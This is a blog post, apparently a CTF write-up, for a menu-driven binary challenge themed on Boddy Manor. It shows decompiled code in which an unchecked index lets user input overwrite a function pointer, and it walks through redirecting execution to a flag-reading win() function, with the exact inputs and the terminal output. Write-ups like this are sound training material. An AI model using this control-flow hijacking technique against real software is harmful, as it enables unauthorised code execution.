---
layout: post
title: "Cyberscape 2026 (Miss Scarlett Room Roster)"
date: 2026-10-29
---

Another one from Cyberscape 2026, the CTF run by the National Cyber & Forensics Alliance. This one was [Miss Scarlett's Room Roster](/assets/files/miss_scarlett_room_roster), a Boddy Manor-themed binary built around a function pointer table, and a function pointer overwrite ended up being the way in.

<details markdown="1">
<summary>Table of Contents</summary>

- [Binary Triage](#binary-triage)
- [Finding the Bug](#finding-the-bug)
- [The Target](#the-target)
- [Exploiting It](#exploiting-it)

</details>

### Binary Triage

I kicked things off with `file` to get my bearings. It came back as a 64-bit ELF, little-endian, dynamically linked against `/lib64/ld-linux-x86-64.so.2`, and still carrying `debug_info` — not stripped, so I'd get real function and variable names in the decompiler instead of auto-generated labels.

```
user@debian:~/Downloads$ file miss_scarlett_room_roster
miss_scarlett_room_roster: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, with debug_info, not stripped
```

Next I ran `hardening-check` to see what protections I'd be working around. The binary isn't PIE, so its main code sits at a fixed, predictable address, even though other memory regions can still move under ASLR. Stack protection is on this time, so a plain stack smash wasn't an option. RELRO is enabled but immediate binding isn't, which makes this Partial RELRO rather than Full. Fortify Source, CFI, and branch protection are all missing, and stack clash protection was inconclusive from the output.

```
user@debian:~/Downloads$ hardening-check miss_scarlett_room_roster
miss_scarlett_room_roster:
 Position Independent Executable: no, normal executable!
 Stack protected: yes
 Fortify Source functions: no, only unprotected functions found!
 Read-only relocations: yes
 Immediate binding: no, not found!
 Stack clash protection: unknown, no -fstack-clash-protection instructions found
 Control flow integrity: no, not found!
 Branch Protection: no, not found!
```

### Finding the Bug

With debug symbols intact in IDA Pro, functions and variables showed up under their real names rather than `sub_` labels, which made tracing `main()` and its callees pretty painless. `init_manor()` turned out to be where the program builds its core data structure: a global array of function pointers named `room_doors`, one slot per room, alongside a separate `butler_dispatch` pointer.

```c
void init_manor()
{
  room_doors[0] = (void (*)(void))room_hall;
  room_doors[1] = (void (*)(void))room_lounge;
  room_doors[2] = (void (*)(void))room_dining;
  room_doors[3] = (void (*)(void))room_kitchen;
  room_doors[4] = (void (*)(void))room_ballroom;
  room_doors[5] = (void (*)(void))room_conservatory;
  butler_dispatch = (void (*)(void))polite_refuse;
}
```

Whenever I spot a global array of function pointers that gets invoked later, I go looking for anything else in the binary that writes into it without checking what it's being handed. `install_plaque()` fit the bill perfectly. It takes a door index and a user-supplied address — hex accepted as-is — and writes that address directly into `room_doors[number]`. The only guard is `number < 0`, which stops negative indices but does nothing about an out-of-range index or clobbering a slot that's already set. Whatever lands there gets called the next time that room is toured, so this is an arbitrary function pointer overwrite with no further authorization check in sight.

```c
int install_plaque()
{
  __int64 number; // [rsp+0h] [rbp-10h]

  printf(format: "Door index for plaque rewrite: ");
  number = read_number();
  if ( number < 0 )
    return puts(s: "Negative chambers are not in fashion.");
  printf(format: "Handler address (hex ok): ");
  room_doors[number] = (void (*)(void))read_address();
  return puts(s: "Plaque installed.");
}
```

### The Target

Scrolling further through the function list, I spotted `win()`, which `init_manor()` never references and which never shows up in the program's normal flow either. It opens `/flag.txt`, reads up to 128 bytes into a local buffer with `fgets()`, and prints whatever it got — no arguments to satisfy, no comparisons to beat, just a matter of reaching it. Since the binary isn't PIE, its address is nailed down at compile time, so I grabbed it straight from IDA with no leak required.

```c
unsigned __int64 win()
{
  FILE *stream; // [rsp+8h] [rbp-98h]
  char s[8]; // [rsp+10h] [rbp-90h] BYREF
  ...
  unsigned __int64 v18; // [rsp+98h] [rbp-8h]

  v18 = __readfsqword(0x28u);
  *(_QWORD *)s = 0;
  ...
  stream = fopen(filename: "/flag.txt", modes: "r");
  if ( stream == nullptr )
  {
    puts(s: "The casefile drawer is empty.");
    exit(status: 1);
  }
  if ( fgets(s, n: 128, stream) == nullptr )
  {
    fclose(stream);
    puts(s: "The casefile drawer is empty.");
    exit(status: 1);
  }
  fclose(stream);
  puts(s: "Confidential casefile unlocked:");
  puts(s);
  return v18 - __readfsqword(0x28u);
}
```

### Exploiting It

IDA put `win()` at `0x0000000000401401`. Before poking the real binary, I dropped a placeholder `flag.txt` at the filesystem root so I could tell right away whether the redirect had actually worked, instead of puzzling over a missing-file error later.

```
user@debian:~/Downloads$ echo "ctf{string}" | sudo tee /flag.txt
[sudo] password for user: 
ctf{string}
```

From there it was all menu-driven: option 3 to install a plaque, door index `0`, handler address `0x0000000000401401`. That swapped `room_hall` out of `room_doors[0]` for `win()`. Touring room `0` with option 2 then called whatever sat in that slot, and since `install_plaque()` never validates its target, execution landed right inside `win()`. The placeholder flag came back, confirming the overwrite worked as intended — and the same steps carried over cleanly to the live binary and its real flag.

```
user@debian:~/Downloads$ ./miss_scarlett_room_roster 
====================================
  Miss Scarlett's Room Roster
  Boddy Manor Guest Console
====================================
Guest roster, Thursday.


Commands:
1) List rooms
2) Tour a room
3) Install door plaque
4) Ring the butler
5) Leave the manor
> 3
Door index for plaque rewrite: 0
Handler address (hex ok): 0x0000000000401401
Plaque installed.

Commands:
1) List rooms
2) Tour a room
3) Install door plaque
4) Ring the butler
5) Leave the manor
> 2
Room index: 0
Touring...
Confidential casefile unlocked:
ctf{string}


Commands:
1) List rooms
2) Tour a room
3) Install door plaque
4) Ring the butler
5) Leave the manor
> 5
The manor doors close behind you.
```

Happy hacking!
